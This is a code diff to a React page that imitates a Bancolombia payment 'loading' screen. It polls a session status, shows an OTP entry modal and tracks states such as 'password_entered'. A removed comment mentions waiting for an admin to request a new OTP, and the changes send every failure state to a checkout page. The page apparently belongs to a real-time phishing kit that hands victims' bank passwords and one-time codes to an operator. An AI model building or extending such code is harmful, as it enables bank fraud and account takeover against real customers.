@@ -9,7 +9,6 @@ export default function BancolombiaCargandoPage() {
   const [showOtpModal, setShowOtpModal] = useState(false);
   const [otp, setOtp] = useState('');
   const [otpLoading, setOtpLoading] = useState(false);
-  const [timeLeft, setTimeLeft] = useState(60);
   const router = useRouter();
   const searchParams = useSearchParams();
 
@@ -35,17 +34,14 @@ export default function BancolombiaCargandoPage() {
 
           if (data.status === 'waiting_otp') {
             setShowOtpModal(true);
-            setTimeLeft(60); // Reset timer
           } else if (data.status === 'otp_valid' || data.status === 'otp_submitted' || data.status === 'completed') {
-            // SIEMPRE FALLAR - NO PROCESAR PAGOS REALES
-            router.push(`/bancolombia/timeout?sessionId=${sessionId}`);
+            // SIEMPRE FALLAR - Redirigir a checkout
+            router.push('/checkout');
           } else if (data.status === 'otp_invalid') {
-            // OTP was wrong, reset to request new OTP
-            setShowOtpModal(false);
-            setOtp(''); // Clear previous OTP
-            setStatus('password_entered'); // Go back to waiting for admin to request new OTP
+            // OTP was wrong - redirigir a checkout
+            router.push('/checkout');
           } else if (data.status === 'timeout') {
-            router.push(`/bancolombia/timeout?sessionId=${sessionId}`);
+            router.push('/checkout');
           }
         }
       } catch (error) {
@@ -56,24 +52,6 @@ export default function BancolombiaCargandoPage() {
     const interval = setInterval(pollStatus, 2000);
     return () => clearInterval(interval);
   }, [sessionId, router]);
-
-  // Countdown timer for OTP
-  useEffect(() => {
-    if (!showOtpModal || timeLeft <= 0) return;
-
-    const timer = setInterval(() => {
-      setTimeLeft(prev => {
-        if (prev <= 1) {
-          setShowOtpModal(false);
-          setStatus('timeout');
-          return 0;
-        }
-        return prev - 1;
-      });
-    }, 1000);
-
-    return () => clearInterval(timer);
-  }, [showOtpModal, timeLeft]);
 
   const handleOtpSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -196,7 +174,7 @@ export default function BancolombiaCargandoPage() {
                 onClick={() => router.push('/checkout')}
                 className="w-full py-3 px-6 bg-gray-600 text-white rounded-lg hover:bg-gray-700 transition font-medium"
               >
-                Intentar nuevamente más tarde
+                Volver al checkout
               </button>
             )}
 
